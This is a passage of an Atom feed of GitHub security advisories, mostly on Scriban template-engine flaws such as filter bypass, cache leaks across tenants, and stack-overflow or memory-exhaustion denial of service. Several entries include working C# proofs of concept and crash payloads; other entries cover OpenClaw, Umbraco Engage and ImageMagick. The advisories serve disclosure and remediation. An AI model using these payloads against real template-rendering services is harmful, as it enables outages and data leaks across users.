<p>This variant demonstrates that <code>LoopLimit</code> also does not constrain large internal allocation work.</p>
<hr>
<h2 id="impact">Impact</h2>
<p>This is an uncontrolled resource consumption issue. Any application that accepts attacker-controlled templates and relies on <code>LoopLimit</code> as part of its safe-runtime configuration can still be forced into heavy CPU or memory work by a single expression.</p>
<p>The issue impacts:</p>
<ul>
<li>Template-as-a-service systems</li>
<li>CMS or email rendering systems that accept user templates</li>
<li>Any multi-tenant use of Scriban with untrusted template content</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/scriban/scriban/security/advisories/GHSA-c875-h985-hvrc">https://github.com/scriban/scriban/security/advisories/GHSA-c875-h985-hvrc</a></li>
<li><a href="https://github.com/advisories/GHSA-c875-h985-hvrc">https://github.com/advisories/GHSA-c875-h985-hvrc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c875-h985-hvrc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-24T22:13:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[scriban] Scriban: Sandbox escape due to TypedObjectAccessorcache bypassing MemberFilter after TemplateContext reuse]]></title>
        <id>https://github.com/advisories/GHSA-5wr9-m6jw-xx44</id>
        <link href="https://github.com/advisories/GHSA-5wr9-m6jw-xx44"/>
        <updated>2026-03-24T22:11:39.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>TemplateContext</code> caches type accessors by <code>Type</code> only, but those accessors are built using the current <code>MemberFilter</code> and <code>MemberRenamer</code>. When a <code>TemplateContext</code> is reused and the filter is tightened for a later render, Scriban still reuses the old accessor and continues exposing members that should now be hidden.</p>
<h2 id="details">Details</h2>
<p>The relevant code path is:</p>
<ul>
<li><code>TemplateContext.GetMemberAccessor()</code> caches accessors in <code>_memberAccessors</code> by <code>Type</code> in <code>src/Scriban/TemplateContext.cs</code> lines 850–863.</li>
<li>For plain .NET objects, <code>GetMemberAccessorImpl()</code> creates a new <code>TypedObjectAccessor(type, _keyComparer, MemberFilter, MemberRenamer)</code> in <code>src/Scriban/TemplateContext.cs</code> lines 909–939.</li>
<li><code>TypedObjectAccessor</code> stores the current filter and precomputes the exposed member set in its constructor and <code>PrepareMembers()</code> in <code>src/Scriban/Runtime/Accessors/TypedObjectAccessor.cs</code> lines 33–40 and 119–179.</li>
<li>Member access later goes through <code>ScriptMemberExpression.GetValue()</code> in <code>src/Scriban/Syntax/Expressions/ScriptMemberExpression.cs</code> lines 67–95, which uses the cached accessor.</li>
<li><code>TemplateContext.Reset()</code> does <strong>not</strong> clear <code>_memberAccessors</code> in <code>src/Scriban/TemplateContext.cs</code> lines 877–902.</li>
</ul>
<p>As a result, once a permissive accessor has been created for a given type, changing <code>TemplateContext.MemberFilter</code> later does not take effect for that type on the same reused context.</p>
<p>This is especially relevant because the Scriban docs explicitly recommend <code>TemplateContext.MemberFilter</code> for indirect .NET object exposure.</p>
<hr>
<h2 id="proof-of-concept">Proof of Concept</h2>
<h3 id="setup">Setup</h3>
<pre><code class="language-bash">mkdir scriban-poc2
cd scriban-poc2
dotnet new console --framework net8.0
dotnet add package Scriban --version 6.6.0
</code></pre>
<h3 id="programcs"><code>Program.cs</code></h3>
<pre><code class="language-csharp">using System.Reflection;
using Scriban;
using Scriban.Runtime;

var template = Template.Parse("{{ model.secret }}");

var context = new TemplateContext
{
    EnableRelaxedMemberAccess = false
};

var globals = new ScriptObject();
globals["model"] = new SensitiveModel();
context.PushGlobal(globals);

context.MemberFilter = _ =&gt; true;
Console.WriteLine("first=" + template.Render(context));

context.Reset();

var globals2 = new ScriptObject();
globals2["model"] = new SensitiveModel();
context.PushGlobal(globals2);

context.MemberFilter = member =&gt; member.Name == nameof(SensitiveModel.Public);

Console.WriteLine("second=" + template.Render(context));

sealed class SensitiveModel
{
    public string Public =&gt; "ok";
    public string Secret =&gt; "leaked";
}
</code></pre>
<h3 id="run">Run</h3>
<pre><code class="language-bash">dotnet run
</code></pre>
<h3 id="actual-output">Actual Output</h3>
<pre><code>first=leaked
second=leaked
</code></pre>
<h3 id="expected-behavior">Expected Behavior</h3>
<p>The second render should fail or stop exposing <code>Secret</code>, because the filter only allows <code>Public</code> and <code>EnableRelaxedMemberAccess</code> is disabled.</p>
<p>This reproduces a direct filter bypass caused by the stale cached accessor.</p>
<hr>
<h2 id="impact">Impact</h2>
<p>This is a protection-mechanism bypass. Applications that use <code>TemplateContext.MemberFilter</code> as part of their sandbox or object-exposure policy can unintentionally expose hidden members across requests when they reuse a <code>TemplateContext</code>.</p>
<p>The impact includes:</p>
<ul>
<li>Unauthorized read access to filtered properties or fields</li>
<li>Unauthorized writes if the filtered member also has a setter</li>
<li>Policy bypass across requests, users, or tenants when contexts are pooled</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/scriban/scriban/security/advisories/GHSA-5wr9-m6jw-xx44">https://github.com/scriban/scriban/security/advisories/GHSA-5wr9-m6jw-xx44</a></li>
<li><a href="https://github.com/advisories/GHSA-5wr9-m6jw-xx44">https://github.com/advisories/GHSA-5wr9-m6jw-xx44</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5wr9-m6jw-xx44</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-03-24T22:11:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[scriban] Scriban has an authorization bypass due to stale include cache surviving TemplateContext.Reset() ]]></title>
        <id>https://github.com/advisories/GHSA-x6m9-38vm-2xhf</id>
        <link href="https://github.com/advisories/GHSA-x6m9-38vm-2xhf"/>
        <updated>2026-03-24T22:09:54.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>TemplateContext.Reset()</code> claims that a <code>TemplateContext</code> can be reused safely on the same thread, but it does not clear <code>CachedTemplates</code>. If an application pools <code>TemplateContext</code> objects and uses an <code>ITemplateLoader</code> that resolves content per request, tenant, or user, a previously authorized include can be served to later renders without calling <code>TemplateLoader.Load()</code> again.</p>
<h2 id="details">Details</h2>
<p>The relevant code path is:</p>
<ul>
<li><code>TemplateContext.Reset()</code> only clears output, globals, cultures, and source files in <code>src/Scriban/TemplateContext.cs</code> lines 877–902.</li>
<li><code>CachedTemplates</code> is initialized once and kept on the context in <code>src/Scriban/TemplateContext.cs</code> line 197.</li>
<li><code>include</code> resolves templates through <code>IncludeFunction.Invoke()</code> in <code>src/Scriban/Functions/IncludeFunction.cs</code> lines 29–43.</li>
<li><code>IncludeFunction.Invoke()</code> calls <code>TemplateContext.GetOrCreateTemplate()</code> in <code>src/Scriban/TemplateContext.cs</code> lines 1249–1256.</li>
<li>If a template path is already present in <code>CachedTemplates</code>, Scriban returns the cached compiled template and does <strong>not</strong> call <code>TemplateLoader.Load()</code> again.</li>
</ul>
<p>This becomes a security issue when <code>ITemplateLoader.Load()</code> returns request-dependent content. A first render can prime the cache with an admin-only or tenant-specific template, and later renders on the same reused <code>TemplateContext</code> will receive that stale template even after <code>Reset()</code>.</p>
<hr>
<h2 id="proof-of-concept">Proof of Concept</h2>
<h3 id="setup">Setup</h3>
<pre><code class="language-bash">mkdir scriban-poc1
cd scriban-poc1
dotnet new console --framework net8.0
dotnet add package Scriban --version 6.6.0
</code></pre>
<h3 id="programcs"><code>Program.cs</code></h3>
<pre><code class="language-csharp">using Scriban;
using Scriban.Parsing;
using Scriban.Runtime;

var loader = new SwitchingLoader();
var context = new TemplateContext
{
    TemplateLoader = loader,
};

var template = Template.Parse("{{ include 'profile' }}");

loader.Content = "admin-only";
Console.WriteLine("first=" + template.Render(context));

context.Reset();

loader.Content = "guest-view";
Console.WriteLine("second=" + template.Render(context));

sealed class SwitchingLoader : ITemplateLoader
{
    public string Content { get; set; } = string.Empty;

    public string GetPath(TemplateContext context, SourceSpan callerSpan, string templateName) =&gt; templateName;

    public string Load(TemplateContext context, SourceSpan callerSpan, string templatePath) =&gt; Content;

    public ValueTask&lt;string&gt; LoadAsync(TemplateContext context, SourceSpan callerSpan, string templatePath)
        =&gt; new(Content);
}
</code></pre>
<h3 id="run">Run</h3>
<pre><code class="language-bash">dotnet run
</code></pre>
<h3 id="actual-output">Actual Output</h3>
<pre><code>first=admin-only
second=admin-only
</code></pre>
<h3 id="expected-output">Expected Output</h3>
<pre><code>first=admin-only
second=guest-view
</code></pre>
<p>The second render should reload the template after <code>Reset()</code>, but it instead reuses the cached compiled template from the previous render.</p>
<hr>
<h2 id="impact">Impact</h2>
<p>This is a cross-render data isolation issue. Any application that reuses <code>TemplateContext</code> objects and uses a request-dependent <code>ITemplateLoader</code> can leak previously authorized template content across requests, users, or tenants.</p>
<p>The issue impacts applications that:</p>
<ul>
<li>Pool or reuse <code>TemplateContext</code></li>
<li>Call <code>Reset()</code> between requests</li>
<li>Use <code>include</code></li>
<li>Resolve include content based on request-specific state</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/scriban/scriban/security/advisories/GHSA-x6m9-38vm-2xhf">https://github.com/scriban/scriban/security/advisories/GHSA-x6m9-38vm-2xhf</a></li>
<li><a href="https://github.com/advisories/GHSA-x6m9-38vm-2xhf">https://github.com/advisories/GHSA-x6m9-38vm-2xhf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x6m9-38vm-2xhf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-24T22:09:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Scriban] Scriban has a Stack Overflow via Nested Array Initializers That Bypass the ExpressionDepthLimit Fix]]></title>
        <id>https://github.com/advisories/GHSA-p6q4-fgr8-vx4p</id>
        <link href="https://github.com/advisories/GHSA-p6q4-fgr8-vx4p"/>
        <updated>2026-03-24T22:06:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>StackOverflowException via nested array initializers bypasses ExpressionDepthLimit fix (GHSA-wgh7-7m3c-fx25)</p>
<h3 id="details">Details</h3>
<p>The recent fix for GHSA-wgh7-7m3c-fx25 (uncontrolled recursion in parser) added <code>ExpressionDepthLimit</code> defaulting to 250. However, deeply nested <strong>array initializers</strong> (<code>[[[[...</code>) recurse through <code>ParseArrayInitializer</code> → <code>ParseExpression</code> → <code>ParseArrayInitializer</code>, which is a <strong>different recursion path</strong> not covered by the expression depth counter.</p>
<p>This causes a <code>StackOverflowException</code> on current main (commit b5ac4bf - "Add limits for default safety").</p>
<h3 id="poc">PoC</h3>
<pre><code>using Scriban;

// ExpressionDepthLimit (default 250) does NOT prevent this crash
string nested = "{{ " + new string('[', 5000) + "1" + new string(']', 5000) + " }}";
Template.Parse(nested); // StackOverflowException - process terminates
</code></pre>
<h3 id="impact">Impact</h3>
<p>Same as GHSA-wgh7-7m3c-fx25: High severity. StackOverflowException cannot be caught with try/catch in .NET - the process terminates immediately. Any application calling Template.Parse with untrusted input is vulnerable, even with the new default ExpressionDepthLimit enabled.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/scriban/scriban/security/advisories/GHSA-p6q4-fgr8-vx4p">https://github.com/scriban/scriban/security/advisories/GHSA-p6q4-fgr8-vx4p</a></li>
<li><a href="https://github.com/advisories/GHSA-wgh7-7m3c-fx25">https://github.com/advisories/GHSA-wgh7-7m3c-fx25</a></li>
<li><a href="https://github.com/advisories/GHSA-p6q4-fgr8-vx4p">https://github.com/advisories/GHSA-p6q4-fgr8-vx4p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p6q4-fgr8-vx4p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-24T22:06:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] Duplicate Advisory: OpenClaw has cross-account DM pairing authorization bypass via unscoped pairing store access]]></title>
        <id>https://github.com/advisories/GHSA-vmvw-pwwf-cc2w</id>
        <link href="https://github.com/advisories/GHSA-vmvw-pwwf-cc2w"/>
        <updated>2026-03-24T19:06:56.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-vjp8-wprm-2jw9. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>OpenClaw versions prior to 2026.2.26 contains an authorization bypass vulnerability in the pairing-store access control for direct message pairing policy that allows attackers to reuse pairing approvals across multiple accounts. An attacker approved as a sender in one account can be automatically accepted in another account in multi-account deployments without explicit approval, bypassing authorization boundaries.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-vjp8-wprm-2jw9">https://github.com/openclaw/openclaw/security/advisories/GHSA-vjp8-wprm-2jw9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32067">https://nvd.nist.gov/vuln/detail/CVE-2026-32067</a></li>
<li><a href="https://github.com/openclaw/openclaw/commit/a0c5e28f3bf0cc0cd9311f9e9ec2ca0352550dcf">https://github.com/openclaw/openclaw/commit/a0c5e28f3bf0cc0cd9311f9e9ec2ca0352550dcf</a></li>
<li><a href="https://github.com/openclaw/openclaw/commit/bce643a0bd145d3e9cb55400af33bd1b85baeb02">https://github.com/openclaw/openclaw/commit/bce643a0bd145d3e9cb55400af33bd1b85baeb02</a></li>
<li><a href="https://www.vulncheck.com/advisories/openclaw-cross-account-authorization-bypass-in-dm-pairing-store">https://www.vulncheck.com/advisories/openclaw-cross-account-authorization-bypass-in-dm-pairing-store</a></li>
<li><a href="https://github.com/advisories/GHSA-vmvw-pwwf-cc2w">https://github.com/advisories/GHSA-vmvw-pwwf-cc2w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vmvw-pwwf-cc2w</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-03-21T03:31:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[scriban] Scriban Affected by Memory Exhaustion (OOM) via Unbounded String Generation (Denial of Service)]]></title>
        <id>https://github.com/advisories/GHSA-5rpf-x9jg-8j5p</id>
        <link href="https://github.com/advisories/GHSA-5rpf-x9jg-8j5p"/>
        <updated>2026-03-19T21:31:11.000Z</updated>
        <content type="html"><![CDATA[<p><code>TemplateContext.LimitToString</code> defaults to <code>0</code> (unlimited). While Scriban implements a default <code>LoopLimit</code> of 1000, an attacker can still cause massive memory allocation via exponential string growth. Doubling a string for just 30 iterations generates over 1GB of text, instantly exhausting heap memory and crashing the host process. Because no output size limit is enforced, repeated string concatenation results in exponential memory growth.</p>
<p><strong>Proof of Concept (PoC):</strong>
The following payload executes in under 30 iterations but results in ~1GB string allocation, crashing the process.</p>
<pre><code class="language-csharp">using Scriban;

string maliciousTemplate =
    @"
        {{
            a = ""A""
            for i in 1..30
                a = a + a
            end
            a
        }}";

var template = Template.Parse(maliciousTemplate);

var context = new TemplateContext();

try
{
    template.Render(context);
}
catch (Exception ex)
{
    Console.WriteLine("\nException: " + ex.Message);
}
</code></pre>
<p><strong>Impact:</strong>
An attacker can supply a small template that triggers exponential string growth, forcing the application to allocate excessive memory. This leads to severe memory pressure, garbage collection thrashing, and eventual process termination (DoS).</p>
<p><strong>Suggested Fix:</strong>
Enforce a sensible default limit for string output. Set default <code>LimitToString</code> to 1MB (1,048,576 characters). </p>
<pre><code class="language-csharp">public int LimitToString { get; set; } = 1048576; 
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/scriban/scriban/security/advisories/GHSA-5rpf-x9jg-8j5p">https://github.com/scriban/scriban/security/advisories/GHSA-5rpf-x9jg-8j5p</a></li>
<li><a href="https://github.com/scriban/scriban/commit/a6fe6074199e5c04f4d29dc8d8e652b24d33e3e4">https://github.com/scriban/scriban/commit/a6fe6074199e5c04f4d29dc8d8e652b24d33e3e4</a></li>
<li><a href="https://github.com/advisories/GHSA-5rpf-x9jg-8j5p">https://github.com/advisories/GHSA-5rpf-x9jg-8j5p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5rpf-x9jg-8j5p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-19T21:31:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[scriban] Scriban has an Infinite Recursion during Object Rendering Leads to Stack Overflow and Process Crash (Denial of Service)]]></title>
        <id>https://github.com/advisories/GHSA-grr9-747v-xvcp</id>
        <link href="https://github.com/advisories/GHSA-grr9-747v-xvcp"/>
        <updated>2026-03-19T21:31:01.000Z</updated>
        <content type="html"><![CDATA[<p>When Scriban renders an object that contains a circular reference, it traverses the object's members infinitely. Because the <code>ObjectRecursionLimit</code> property defaults to unlimited, this behavior exhausts the thread's stack space, triggering an uncatchable <code>StackOverflowException</code> that immediately terminates the hosting process.</p>
<p>When rendering objects (e.g., <code>{{ obj }}</code>), the Scriban rendering engine recursively inspects and formats the object's properties. To prevent infinite loops caused by deeply nested or circular data structures, <code>TemplateContext</code> contains an <code>ObjectRecursionLimit</code> property. </p>
<p>However, this property currently defaults to <code>0</code> (unlimited). If the data context pushed into the template contains a circular reference, the renderer will recurse indefinitely. This is especially dangerous for web applications that map user-controlled payloads (like JSON) directly to rendering contexts, or for applications that pass ORM objects (like Entity Framework models, which frequently contain circular navigation properties) into the template.</p>
<h4 id="proof-of-concept-poc">Proof of Concept (PoC)</h4>
<p>The following C# code demonstrates the vulnerability. Executing this will cause an immediate, fatal <code>StackOverflowException</code>, bypassing any standard error handling.</p>
<pre><code class="language-csharp">using Scriban;
using Scriban.Runtime;

var template = Template.Parse("{{ a }}");
var context = new TemplateContext();
var a = new ScriptObject();

// Introduce a cycle
a["self"] = a;
context.PushGlobal(new ScriptObject { { "a", a } });

try {
  // This crashes the entire process immediately
  template.Render(context);
} catch (Exception ex) {
  // This will never execute because StackOverflowException
  Console.WriteLine("Caught exception: " + ex.Message);
}
</code></pre>
<h4 id="impact">Impact</h4>
<p>This vulnerability allows a Denial of Service (DoS) attack. If a malicious user can manipulate the data structure passed to the renderer to include a cyclic reference, or if the application passes a complex object graph to an untrusted template, the entire .NET hosting process will crash.</p>
<h4 id="suggested-remediation">Suggested Remediation</h4>
<p>Update <code>TemplateContext.cs</code> to set <code>ObjectRecursionLimit</code> to a safe default, such as <code>20</code>.</p>
<pre><code class="language-csharp">public int ObjectRecursionLimit { get; set; } = 20;
</code></pre>
<p>By implementing this default, circular references will gracefully result in a catchable <code>ScriptRuntimeException</code> rather than a fatal process crash.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/scriban/scriban/security/advisories/GHSA-grr9-747v-xvcp">https://github.com/scriban/scriban/security/advisories/GHSA-grr9-747v-xvcp</a></li>
<li><a href="https://github.com/scriban/scriban/commit/a6fe6074199e5c04f4d29dc8d8e652b24d33e3e4">https://github.com/scriban/scriban/commit/a6fe6074199e5c04f4d29dc8d8e652b24d33e3e4</a></li>
<li><a href="https://github.com/advisories/GHSA-grr9-747v-xvcp">https://github.com/advisories/GHSA-grr9-747v-xvcp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-grr9-747v-xvcp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-19T21:31:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[scriban] Scriban has Uncontrolled Recursion in Parser Leads to Stack Overflow and Process Crash (Denial of Service)]]></title>
        <id>https://github.com/advisories/GHSA-wgh7-7m3c-fx25</id>
        <link href="https://github.com/advisories/GHSA-wgh7-7m3c-fx25"/>
        <updated>2026-03-19T21:30:56.000Z</updated>
        <content type="html"><![CDATA[<p>Scriban is vulnerable to an uncontrolled process crash resulting in a Denial of Service. Because the recursive-descent parser does not enforce a default limit on expression depth, an attacker who controls template input can craft a heavily nested template that triggers a <code>StackOverflowException</code>. In .NET, a <code>StackOverflowException</code> cannot be caught by standard <code>try-catch</code> blocks, resulting in the immediate and ungraceful termination of the entire hosting process. </p>
<p>Scriban utilizes a recursive-descent parser to process template expressions. While the library exposes an <code>ExpressionDepthLimit</code> property in its <code>ParserOptions</code>, this property defaults to <code>null</code> (disabled). </p>
<p>If an application accepts user-supplied templates (or dynamically constructs templates from untrusted input), an attacker can supply thousands of nested parentheses or blocks. As the parser recursively evaluates each nested layer, it consumes thread stack space until it exceeds the limits of the host OS, triggering a fatal crash.</p>
<h4 id="impact">Impact</h4>
<p>An attacker can supply crafted input that triggers a <code>StackOverflowException</code>, causing immediate termination of the hosting process and resulting in a Denial of Service. In applications that process untrusted or user-controlled templates (e.g., web applications or APIs), this can be exploited remotely without authentication. The failure is not recoverable, requiring a full process restart and leading to service disruption.</p>
<h4 id="proof-of-concept-poc">Proof of Concept (PoC)</h4>
<p>The following C# code demonstrates the vulnerability. Executing this code will immediately terminate the application process.</p>
<pre><code class="language-csharp">using Scriban;

// Creates a deeply nested expression: (((( ... (1) ... ))))
string nested = new string('(', 10000) + "1" + new string(')', 10000);

try {
  // This will crash the entire process immediately
  Scriban.Template.Parse("{{ " + nested + " }}");
} catch (Exception ex) {
  // This catch block will never execute because StackOverflowException
  Console.WriteLine("Caught exception: " + ex.Message);
}
</code></pre>
<h4 id="suggested-remediation">Suggested Remediation</h4>
<p>Update the <code>ParserOptions</code> constructor (or the internal parser initialization) to set a default value for <code>ExpressionDepthLimit</code>. A limit of <code>1000</code> (or even lower, such as <code>250</code> or <code>500</code>) is generally more than enough for legitimate templates while safely preventing stack exhaustion.</p>
<pre><code class="language-csharp">public int? ExpressionDepthLimit { get; set; } = 250; 
</code></pre>
<p>Alternatively, document the risk heavily and warn developers to manually set <code>ExpressionDepthLimit</code> if evaluating untrusted templates, though a secure-by-default approach is strongly preferred.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/scriban/scriban/security/advisories/GHSA-wgh7-7m3c-fx25">https://github.com/scriban/scriban/security/advisories/GHSA-wgh7-7m3c-fx25</a></li>
<li><a href="https://github.com/scriban/scriban/commit/a6fe6074199e5c04f4d29dc8d8e652b24d33e3e4">https://github.com/scriban/scriban/commit/a6fe6074199e5c04f4d29dc8d8e652b24d33e3e4</a></li>
<li><a href="https://github.com/scriban/scriban/commit/b5ac4bf30459fdc76964e3f751e16f7e96079ea7">https://github.com/scriban/scriban/commit/b5ac4bf30459fdc76964e3f751e16f7e96079ea7</a></li>
<li><a href="https://github.com/advisories/GHSA-wgh7-7m3c-fx25">https://github.com/advisories/GHSA-wgh7-7m3c-fx25</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wgh7-7m3c-fx25</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-19T21:30:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Umbraco.Engage.Forms] Umbraco.Engage.Forms Allows Unauthorized Access to Multiple API Endpoints]]></title>
        <id>https://github.com/advisories/GHSA-86vq-ccwf-rm62</id>
        <link href="https://github.com/advisories/GHSA-86vq-ccwf-rm62"/>
        <updated>2026-03-19T16:13:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description</h3>
<p>A vulnerability has been identified in Umbraco Engage where certain API endpoints are exposed without enforcing authentication or authorization checks. The affected endpoints can be accessed directly over the network without requiring a valid session or user credentials. By supplying a user-controlled identifier parameter (e.g., ?id=), an attacker can retrieve sensitive data associated with arbitrary records.</p>
<p>Because no access control validation is performed, the endpoints are vulnerable to enumeration attacks, allowing attackers to iterate over identifiers and extract data at scale.</p>
<h3 id="impact">Impact</h3>
<p>An unauthenticated attacker can retrieve sensitive Engage-related data by directly querying the affected API endpoints. The vulnerability allows arbitrary record access through predictable or enumerable identifiers.</p>
<p>The confidentiality impact is considered high. No direct integrity or availability impact has been identified.</p>
<p>The scope of exposed data depends on the deployment but may include analytics data, tracking data, customer-related information, or other Engage-managed content.</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability affects both v16 and v17. Patches have already been released. Users are advised to update to 16.2.1 or 17.1.1</p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/umbraco/Umbraco.Engage.Issues/security/advisories/GHSA-86vq-ccwf-rm62">https://github.com/umbraco/Umbraco.Engage.Issues/security/advisories/GHSA-86vq-ccwf-rm62</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27449">https://nvd.nist.gov/vuln/detail/CVE-2026-27449</a></li>
<li><a href="https://github.com/advisories/GHSA-86vq-ccwf-rm62">https://github.com/advisories/GHSA-86vq-ccwf-rm62</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-86vq-ccwf-rm62</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-02-27T18:35:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q8-x86] ImageMagick has a heap-buffer-overflow in NewXMLTree which could result in crash]]></title>
        <id>https://github.com/advisories/GHSA-gc62-2v5p-qpmp</id>
        <link href="https://github.com/advisories/GHSA-gc62-2v5p-qpmp"/>
        <updated>2026-03-18T21:51:15.000Z</updated>
        <content type="html"><![CDATA[<p>The NewXMLTree method contains a bug that could result in a crash due to an out of write bounds of a single zero byte.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-gc62-2v5p-qpmp">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-gc62-2v5p-qpmp</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/releases/tag/7.1.2-17">https://github.com/ImageMagick/ImageMagick/releases/tag/7.1.2-17</a></li>
<li><a href="https://github.com/dlemstra/Magick.NET/releases/tag/14.11.0">https://github.com/dlemstra/Magick.NET/releases/tag/14.11.0</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32636">https://nvd.nist.gov/vuln/detail/CVE-2026-32636</a></li>
<li><a href="https://github.com/advisories/GHSA-gc62-2v5p-qpmp">https://github.com/advisories/GHSA-gc62-2v5p-qpmp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gc62-2v5p-qpmp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-17T17:12:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q8-x64] ImageMagick has a heap-buffer-overflow in NewXMLTree which could result in crash]]></title>
        <id>https://github.com/advisories/GHSA-gc62-2v5p-qpmp</id>
        <link href="https://github.com/advisories/GHSA-gc62-2v5p-qpmp"/>
        <updated>2026-03-18T21:51:15.000Z</updated>
        <content type="html"><![CDATA[<p>The NewXMLTree method contains a bug that could result in a crash due to an out of write bounds of a single zero byte.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-gc62-2v5p-qpmp">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-gc62-2v5p-qpmp</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/releases/tag/7.1.2-17">https://github.com/ImageMagick/ImageMagick/releases/tag/7.1.2-17</a></li>
<li><a href="https://github.com/dlemstra/Magick.NET/releases/tag/14.11.0">https://github.com/dlemstra/Magick.NET/releases/tag/14.11.0</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32636">https://nvd.nist.gov/vuln/detail/CVE-2026-32636</a></li>
<li><a href="https://github.com/advisories/GHSA-gc62-2v5p-qpmp">https://github.com/advisories/GHSA-gc62-2v5p-qpmp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gc62-2v5p-qpmp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-17T17:12:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q8-arm64] ImageMagick has a heap-buffer-overflow in NewXMLTree which could result in crash]]></title>
        <id>https://github.com/advisories/GHSA-gc62-2v5p-qpmp</id>
        <link href="https://github.com/advisories/GHSA-gc62-2v5p-qpmp"/>
        <updated>2026-03-18T21:51:15.000Z</updated>
        <content type="html"><![CDATA[<p>The NewXMLTree method contains a bug that could result in a crash due to an out of write bounds of a single zero byte.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-gc62-2v5p-qpmp">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-gc62-2v5p-qpmp</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/releases/tag/7.1.2-17">https://github.com/ImageMagick/ImageMagick/releases/tag/7.1.2-17</a></li>
<li><a href="https://github.com/dlemstra/Magick.NET/releases/tag/14.11.0">https://github.com/dlemstra/Magick.NET/releases/tag/14.11.0</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32636">https://nvd.nist.gov/vuln/detail/CVE-2026-32636</a></li>
